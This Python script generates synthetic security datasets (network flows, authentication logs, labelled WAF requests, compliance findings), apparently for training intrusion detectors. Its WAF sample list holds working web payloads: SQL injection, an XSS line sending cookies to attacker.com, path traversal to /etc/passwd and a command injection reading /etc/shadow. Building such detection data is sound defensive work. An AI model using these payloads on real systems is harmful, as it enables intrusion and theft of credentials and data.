import csv
import json
import os
import random
from datetime import datetime, timedelta

def ensure_dir(path):
    os.makedirs(os.path.dirname(path), exist_ok=True)

def generate_cicids2017_sample(filepath, count=500):
    ensure_dir(filepath)
    stages = ["BENIGN", "RECON", "INITIAL_ACCESS", "CREDENTIAL_ACCESS", "LATERAL_MOVEMENT", "IMPACT"]
    labels_map = {
        "BENIGN": "BENIGN",
        "RECON": "PortScan",
        "INITIAL_ACCESS": "Web Attack - SQL Injection",
        "CREDENTIAL_ACCESS": "FTP-Patator",
        "LATERAL_MOVEMENT": "SSH-Patator",
        "IMPACT": "DoS GoldenEye"
    }

    base_time = datetime(2026, 8, 28, 10, 0, 0)

    # Create a few synthetic sessions
    sessions = [f"SESS_{i:03d}" for i in range(1, 6)]  # SESS_001 .. SESS_005
    current_session_idx = 0
    last_stage = "BENIGN"

    records = []

    for i in range(count):
        # Occasionally move to next session to simulate multiple users
        if i > 0 and i % (count // len(sessions)) == 0:
            current_session_idx = (current_session_idx + 1) % len(sessions)
            last_stage = "BENIGN"

        session_id = sessions[current_session_idx]

        # Progress attack stages within a session
        if last_stage == "BENIGN":
            stage = random.choices(["BENIGN", "RECON"], weights=[0.7, 0.3])[0]
        elif last_stage == "RECON":
            stage = random.choices(["RECON", "INITIAL_ACCESS"], weights=[0.4, 0.6])[0]
        elif last_stage == "INITIAL_ACCESS":
            stage = random.choices(["INITIAL_ACCESS", "CREDENTIAL_ACCESS"], weights=[0.4, 0.6])[0]
        elif last_stage == "CREDENTIAL_ACCESS":
            stage = random.choices(["CREDENTIAL_ACCESS", "LATERAL_MOVEMENT"], weights=[0.5, 0.5])[0]
        elif last_stage == "LATERAL_MOVEMENT":
            stage = random.choices(["LATERAL_MOVEMENT", "IMPACT", "BENIGN"], weights=[0.4, 0.2, 0.4])[0]
        else:
            stage = random.choices(["BENIGN", "RECON"], weights=[0.8, 0.2])[0]

        if stage != "BENIGN":
            last_stage = stage

        label = labels_map[stage]

        src_ip = f"192.168.1.{random.randint(10, 250)}" if stage == "BENIGN" else f"10.0.4.{random.randint(1, 50)}"
        dst_ip = f"172.16.0.{random.randint(5, 50)}"
        src_port = random.randint(1024, 65535)
        dst_port = random.choice([80, 443, 22, 21, 3389, 8080, 445]) if stage != "RECON" else random.randint(1, 1000)
        protocol = 6  # TCP

        ts = base_time + timedelta(seconds=i * random.randint(1, 5))
        ts_str = ts.strftime("%Y-%m-%d %H:%M:%S")

        duration = round(random.uniform(0.01, 120.0), 4)
        fwd_pkts = random.randint(1, 500) if stage != "IMPACT" else random.randint(1000, 10000)
        bwd_pkts = random.randint(0, 400)
        fwd_bytes = fwd_pkts * random.randint(40, 1460)
        bwd_bytes = bwd_pkts * random.randint(40, 1460)
        flow_bytes_s = round((fwd_bytes + bwd_bytes) / max(duration, 0.001), 2)
        flow_pkts_s = round((fwd_pkts + bwd_pkts) / max(duration, 0.001), 2)
        flow_iat_mean = round(random.uniform(0.001, 2.0), 4)
        flow_iat_std = round(random.uniform(0.0001, 1.0), 4)

        syn_flag = 1 if stage in ["RECON", "CREDENTIAL_ACCESS"] and random.random() > 0.3 else random.randint(0, 1)
        ack_flag = random.randint(0, 1)
        fin_flag = 1 if random.random() > 0.8 else 0
        rst_flag = 1 if stage == "RECON" and random.random() > 0.5 else 0

        waf_score = round(random.uniform(0.7, 0.99), 2) if stage == "INITIAL_ACCESS" else round(random.uniform(0.0, 0.2), 2)
        behavior_score = round(random.uniform(0.6, 0.95), 2) if stage in ["CREDENTIAL_ACCESS", "LATERAL_MOVEMENT"] else round(random.uniform(0.0, 0.25), 2)
        compliance_score = round(random.uniform(0.4, 0.85), 2)

        records.append({
            "session_id": session_id,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "protocol": protocol,
            "timestamp": ts_str,
            "duration": duration,
            "total_fwd_packets": fwd_pkts,
            "total_bwd_packets": bwd_pkts,
            "total_length_fwd_packets": fwd_bytes,
            "total_length_bwd_packets": bwd_bytes,
            "flow_bytes_s": flow_bytes_s,
            "flow_packets_s": flow_pkts_s,
            "flow_iat_mean": flow_iat_mean,
            "flow_iat_std": flow_iat_std,
            "syn_flag_count": syn_flag,
            "ack_flag_count": ack_flag,
            "fin_flag_count": fin_flag,
            "rst_flag_count": rst_flag,
            "waf_risk": waf_score,
            "behavior_risk": behavior_score,
            "compliance_score": compliance_score,
            "attack_stage": stage,
            "label": label
        })

    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(records[0].keys()))
        writer.writeheader()
        writer.writerows(records)
    print(f"Generated {count} CIC-IDS2017 sample records at {filepath}")

def generate_lanl_auth_sample(filepath, count=300):
    ensure_dir(filepath)
    users = [f"USER_{i}" for i in range(101, 125)]
    devices = [f"DEV_WORKSTATION_{i}" for i in range(1, 20)] + [f"SRV_DB_{i}" for i in range(1, 5)]
    resources = ["/api/v1/auth", "/admin/db_backup", "/finance/records", "/public/index.html", "/sys/config"]
    ips = [f"192.168.1.{i}" for i in range(10, 60)] + ["10.0.4.15", "10.0.4.99"]

    base_time = datetime(2026, 8, 28, 8, 0, 0)
    records = []

    for i in range(count):
        user = random.choice(users)
        device = random.choice(devices)
        resource = random.choice(resources)
        ip = random.choice(ips)
        login_dt = base_time + timedelta(minutes=i * random.randint(1, 10))
        logout_dt = login_dt + timedelta(minutes=random.randint(15, 240))
        success = random.choices([1, 0], weights=[0.85, 0.15])[0]
        auth_method = random.choice(["Password", "MFA", "SSH-Key", "Kerberos"])

        records.append({
            "user_id": user,
            "device_id": device,
            "ip": ip,
            "resource": resource,
            "login_time": login_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "logout_time": logout_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "success": success,
            "auth_method": auth_method,
            "sensitive_access": 1 if "/admin" in resource or "/finance" in resource else 0
        })

    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(records[0].keys()))
        writer.writeheader()
        writer.writerows(records)
    print(f"Generated {count} LANL auth records at {filepath}")

def generate_waf_payloads(filepath):
    ensure_dir(filepath)
    payloads = [
        # SQL Injection
        {"method": "POST", "path": "/api/login", "query": "", "headers": '{"User-Agent": "Mozilla/5.0"}', "body": 'username=admin\' OR \'1\'=\'1&password=123', "label": 1, "attack_type": "SQL Injection"},
        {"method": "GET", "path": "/products", "query": "id=1 UNION SELECT 1,username,password FROM users--", "headers": '{"User-Agent": "sqlmap/1.5"}', "body": "", "label": 1, "attack_type": "SQL Injection"},
        {"method": "GET", "path": "/search", "query": "q=test'; DROP TABLE logs;--", "headers": '{"User-Agent": "Mozilla/5.0"}', "body": "", "label": 1, "attack_type": "SQL Injection"},

        # XSS
        {"method": "POST", "path": "/comments", "query": "", "headers": '{"Content-Type": "application/json"}', "body": '{"comment": "<script>alert(document.cookie)</script>"}', "label": 1, "attack_type": "XSS"},
        {"method": "GET", "path": "/profile", "query": "name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>", "headers": '{"User-Agent": "Mozilla/5.0"}', "body": "", "label": 1, "attack_type": "XSS"},

        # Path Traversal & Command Injection
        {"method": "GET", "path": "/download", "query": "file=../../../../etc/passwd", "headers": '{"User-Agent": "curl/7.68.0"}', "body": "", "label": 1, "attack_type": "Path Traversal"},
        {"method": "POST", "path": "/api/ping", "query": "", "headers": '{"User-Agent": "Mozilla/5.0"}', "body": "ip=127.0.0.1; cat /etc/shadow", "label": 1, "attack_type": "Command Injection"},

        # Brute Force / Malicious Bot
        {"method": "POST", "path": "/api/login", "query": "", "headers": '{"User-Agent": "Hydra/9.1"}', "body": "username=admin&password=password123", "label": 1, "attack_type": "Brute Force"},

        # Benign Requests
        {"method": "GET", "path": "/index.html", "query": "", "headers": '{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}', "body": "", "label": 0, "attack_type": "BENIGN"},
        {"method": "GET", "path": "/static/css/main.css", "query": "v=1.2", "headers": '{"User-Agent": "Mozilla/5.0"}', "body": "", "label": 0, "attack_type": "BENIGN"},
        {"method": "POST", "path": "/api/v1/user/settings", "query": "", "headers": '{"Authorization": "Bearer eyJhbGci..."}', "body": '{"theme": "dark", "notifications": true}', "label": 0, "attack_type": "BENIGN"},
        {"method": "GET", "path": "/api/v1/products", "query": "category=electronics&page=2&limit=20", "headers": '{"User-Agent": "Mozilla/5.0"}', "body": "", "label": 0, "attack_type": "BENIGN"},
        {"method": "POST", "path": "/api/contact", "query": "", "headers": '{"Content-Type": "application/x-www-form-urlencoded"}', "body": "name=John+Doe&email=john%40example.com&message=Hello+support", "label": 0, "attack_type": "BENIGN"},
    ]

    # Expand dataset to ~130 samples
    expanded = []
    for _ in range(10):
        for item in payloads:
            cp = item.copy()
            if cp["label"] == 0:
                cp["query"] += f"&ref={random.randint(100, 999)}" if cp["query"] else f"ref={random.randint(100, 999)}"
            expanded.append(cp)

    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["method", "path", "query", "headers", "body", "label", "attack_type"])
        writer.writeheader()
        writer.writerows(expanded)
    print(f"Generated {len(expanded)} WAF payloads at {filepath}")

def generate_compliance_benchmarks(filepath):
    ensure_dir(filepath)
    benchmarks = {
        "prowler_aws": [
            {
                "source": "prowler",
                "control_id": "AWS-CIS-1.1",
                "title": "Avoid the use of the root account",
                "severity": "CRITICAL",
                "resource": "arn:aws:iam::123456789012:root",
                "description": "Root account has full administrative privileges and was recently logged into without MFA.",
                "remediation": "Lock root access keys, enforce hardware MFA, and delegate daily admin tasks to IAM roles.",
                "status": "OPEN",
                "nciipc_guideline": "NCIIPC-SEC-01 (Access Control & Least Privilege)"
            },
            {
                "source": "prowler",
                "control_id": "AWS-CIS-2.1.1",
                "title": "Ensure S3 Bucket Policy restricts public read/write access",
                "severity": "HIGH",
                "resource": "s3://corp-db-backups-bucket",
                "description": "S3 bucket is publicly accessible over the internet allowing unauthenticated data theft.",
                "remediation": "Enable S3 Block Public Access at bucket and account level, update bucket policy.",
                "status": "OPEN",
                "nciipc_guideline": "NCIIPC-DATA-04 (Sensitive Data Protection & Storage Encryption)"
            },
            {
                "source": "prowler",
                "control_id": "AWS-CIS-3.1",
                "title": "Ensure CloudTrail is enabled in all regions",
                "severity": "MEDIUM",
                "resource": "CloudTrail: ap-south-1",
                "description": "Multi-region logging is disabled in ap-south-1 (Mumbai).",
                "remediation": "Configure CloudTrail multi-region trail logging to send logs to centralized S3 bucket.",
                "status": "RESOLVED",
                "nciipc_guideline": "NCIIPC-LOG-02 (Centralized Audit Trail & Log Retention)"
            }
        ],
        "kube_bench_k8s": [
            {
                "source": "kube-bench",
                "control_id": "K8S-CIS-1.2.1",
                "title": "Ensure anonymous requests are rejected by API server",
                "severity": "CRITICAL",
                "resource": "kube-apiserver",
                "description": "Kubernetes API server allows unauthenticated anonymous requests (--anonymous-auth=true).",
                "remediation": "Edit /etc/kubernetes/manifests/kube-apiserver.yaml and set --anonymous-auth=false.",
                "status": "OPEN",
                "nciipc_guideline": "NCIIPC-K8S-01 (Perimeter & API Authentication)"
            },
            {
                "source": "kube-bench",
                "control_id": "K8S-CIS-4.2.1",
                "title": "Minimize privileged containers in cluster",
                "severity": "HIGH",
                "resource": "pod/monitoring-agent-priv",
                "description": "Container runs with securityContext.privileged=true allowing container escape.",
                "remediation": "Drop CAP_SYS_ADMIN capabilities and disable privileged mode in PodSpec.",
                "status": "OPEN",
                "nciipc_guideline": "NCIIPC-CONT-03 (Container Isolation & Runtime Security)"
            }
        ]
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(benchmarks, f, indent=2)
    print(f"Generated compliance benchmarks at {filepath}")

if __name__ == "__main__":
    generate_cicids2017_sample("data/cicids2017_sample.csv")
    generate_lanl_auth_sample("data/lanl_auth_sample.csv")
    generate_waf_payloads("data/http_waf_payloads.csv")
    generate_compliance_benchmarks("data/compliance_benchmarks.json")
